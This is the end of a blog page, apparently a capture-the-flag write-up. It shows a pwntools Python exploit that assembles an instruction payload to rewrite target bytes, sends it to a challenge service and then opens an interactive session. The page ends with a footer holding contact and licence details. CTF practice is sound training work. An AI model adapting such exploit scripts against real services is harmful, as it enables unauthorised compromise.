style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> add</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">f</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> _or</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">e</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> _or</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> i</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> j</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">c</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> i</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> j</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">src </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">7f</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">b0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">68</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">9f</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">e4</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">target </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">a8</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">f1</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ba</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">c0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">e3</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#5eaab5">]</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> _and</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">    # for j in range(src[i], target[i]):</span><br><span style="color:#758575DD">    #     payload += _and(0, 1, 0)</span><br><span style="color:#758575DD">    #     payload += add((0x18 + i) * 8 + 0, 1, 1)</span><br><span style="color:#758575DD">    #     for k in range(1, 7):</span><br><span style="color:#758575DD">    #          payload += add((0x18 + i) * 8 + k, 1, 0)</span><br><span style="color:#DBD7CAEE">    tmp </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> -</span><span style="color:#DBD7CAEE"> src</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#B8A965"> bin</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tmp</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#5eaab5">]</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">rjust</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#666666">::</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> j </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">j</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> add</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> i</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> j</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">j</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> add</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">18</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> i</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> j</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Code Count:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> //</span><span style="color:#4C9A91"> 4</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Code: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>